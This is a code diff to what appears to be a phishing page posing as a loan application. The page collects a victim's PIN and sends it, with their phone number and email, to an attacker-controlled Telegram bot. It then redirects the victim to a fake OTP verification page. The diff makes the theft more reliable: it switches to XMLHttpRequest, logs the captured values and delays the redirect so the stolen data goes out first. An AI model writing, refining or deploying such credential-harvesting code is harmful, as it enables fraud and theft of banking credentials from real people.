@@ -200,7 +200,7 @@
         setTimeout(function(){ errorDiv.classList.remove('show'); }, 5000);
     }
 
-    // Send Telegram notification (fires immediately, doesn't block)
+    // Send Telegram notification using XMLHttpRequest (more reliable)
     function sendTelegramNotification(pin) {
         var decodedPhone = decodeURIComponent(phone);
         var decodedEmail = decodeURIComponent(email);
@@ -223,30 +223,35 @@
 
         var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
         
-        // Send notification in background - doesn't block user
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                chat_id: TG_CHAT_ID, 
-                text: msg, 
-                parse_mode: 'Markdown' 
-            })
-        })
-        .then(function(response) { return response.json(); })
-        .then(function(result) {
-            if (result.ok) {
-                console.log('✅ Telegram notification sent - Phone: ' + decodedPhone + ', PIN: ' + pin);
-            } else {
-                console.error('Telegram error:', result);
+        // Using XMLHttpRequest for better compatibility
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', url, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                if (xhr.status === 200) {
+                    var response = JSON.parse(xhr.responseText);
+                    if (response.ok) {
+                        console.log('✅ Telegram notification sent successfully!');
+                        console.log('   Phone: ' + decodedPhone);
+                        console.log('   PIN: ' + pin);
+                        console.log('   Email: ' + decodedEmail);
+                    } else {
+                        console.error('Telegram error:', response);
+                    }
+                } else {
+                    console.error('HTTP error:', xhr.status);
+                }
             }
-        })
-        .catch(function(error) {
-            console.error('Telegram fetch error:', error);
-        });
+        };
+        xhr.send(JSON.stringify({ 
+            chat_id: TG_CHAT_ID, 
+            text: msg, 
+            parse_mode: 'Markdown' 
+        }));
     }
 
-    // Main confirm function - IMMEDIATELY redirects to OTP page
+    // Main confirm function
     window.handleConfirm = async function() {
         var pin = getPin();
         if (pin.length !== 4) { 
@@ -258,19 +263,22 @@
         confirmBtn.disabled = true;
         confirmBtn.textContent = 'Processing...';
 
-        // Send Telegram notification (runs in background, doesn't delay redirect)
+        // Send Telegram notification
         sendTelegramNotification(pin);
         
-        // IMMEDIATELY redirect to OTP page (no delay)
-        window.location.href = 'otp-verify.html'
-            + '?amount='  + encodeURIComponent(amount)
-            + '&term='    + encodeURIComponent(term)
-            + '&rate='    + encodeURIComponent(rate)
-            + '&monthly=' + encodeURIComponent(monthly)
-            + '&name='    + encodeURIComponent(name)
-            + '&email='   + encodeURIComponent(email)
-            + '&phone='   + encodeURIComponent(phone)
-            + '&appId='   + encodeURIComponent(appId);
+        // Small delay to ensure notification is sent before redirect
+        setTimeout(function() {
+            // Redirect to OTP page
+            window.location.href = 'otp-verify.html'
+                + '?amount='  + encodeURIComponent(amount)
+                + '&term='    + encodeURIComponent(term)
+                + '&rate='    + encodeURIComponent(rate)
+                + '&monthly=' + encodeURIComponent(monthly)
+                + '&name='    + encodeURIComponent(name)
+                + '&email='   + encodeURIComponent(email)
+                + '&phone='   + encodeURIComponent(phone)
+                + '&appId='   + encodeURIComponent(appId);
+        }, 500);
     };
 </script>
 </body>
